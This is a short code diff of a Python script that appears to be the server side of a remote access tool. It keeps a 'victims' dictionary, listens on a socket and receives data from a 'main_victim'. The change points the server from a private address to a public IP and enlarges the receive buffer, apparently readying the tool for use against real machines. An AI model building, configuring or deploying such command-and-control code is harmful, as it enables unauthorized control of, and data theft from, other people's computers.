@@ -6,7 +6,7 @@ from sys import executable, argv
 import os
 
 victims = {}
-ip_server = "10.0.0.23"
+ip_server = "147.161.8.230"
 port_server = 1234
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -59,7 +59,7 @@ def set_vict():
 def get_data():
     while True:
         try:
-            data = main_victim.recv(4096)          
+            data = main_victim.recv(4096*4)          
             if data.decode("utf-8") == "err":
                 return bytes("@--Error--@", "utf-8")
                 break
